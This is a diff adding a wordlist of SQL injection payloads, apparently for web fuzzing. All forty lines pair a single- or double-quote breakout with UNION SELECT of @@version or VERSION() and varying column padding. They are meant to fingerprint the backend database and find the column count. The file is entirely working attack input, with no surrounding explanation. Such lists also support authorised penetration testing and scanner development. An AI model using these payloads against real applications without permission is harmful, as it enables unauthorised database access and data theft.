@@ -1,0 +1,40 @@
+' UNION SELECT @@version -- -
+' UNION SELECT VERSION() -- -
+' UNION SELECT @@version, NULL -- -
+' UNION SELECT VERSION(), NULL -- -
+' UNION SELECT @@version, NULL, NULL -- -
+' UNION SELECT VERSION(), NULL, NULL -- -
+' UNION SELECT @@version, NULL, NULL, NULL -- -
+' UNION SELECT VERSION(), NULL, NULL, NULL -- -
+' UNION SELECT @@version, 2 -- -
+' UNION SELECT VERSION(), 2 -- -
+' UNION SELECT @@version, 2, 3 -- -
+' UNION SELECT VERSION(), 2, 3 -- -
+' UNION SELECT @@version, 2, 3, 4 -- -
+' UNION SELECT VERSION(), 2, 3, 4 -- -
+' UNION SELECT @@version, 'test' -- -
+' UNION SELECT VERSION(), 'test' -- -
+' UNION SELECT @@version, 'test', 'extra' -- -
+' UNION SELECT VERSION(), 'test', 'extra' -- -
+' UNION SELECT @@version, 'value', 'test', 'extra' -- -
+' UNION SELECT VERSION(), 'value', 'test', 'extra' -- -
+" UNION SELECT @@version -- -
+" UNION SELECT VERSION() -- -
+" UNION SELECT @@version, NULL -- -
+" UNION SELECT VERSION(), NULL -- -
+" UNION SELECT @@version, NULL, NULL -- -
+" UNION SELECT VERSION(), NULL, NULL -- -
+" UNION SELECT @@version, NULL, NULL, NULL -- -
+" UNION SELECT VERSION(), NULL, NULL, NULL -- -
+" UNION SELECT @@version, 2 -- -
+" UNION SELECT VERSION(), 2 -- -
+" UNION SELECT @@version, 2, 3 -- -
+" UNION SELECT VERSION(), 2, 3 -- -
+" UNION SELECT @@version, 2, 3, 4 -- -
+" UNION SELECT VERSION(), 2, 3, 4 -- -
+" UNION SELECT @@version, 'test' -- -
+" UNION SELECT VERSION(), 'test' -- -
+" UNION SELECT @@version, 'test', 'extra' -- -
+" UNION SELECT VERSION(), 'test', 'extra' -- -
+" UNION SELECT @@version, 'value', 'test', 'extra' -- -
+" UNION SELECT VERSION(), 'value', 'test', 'extra' -- -
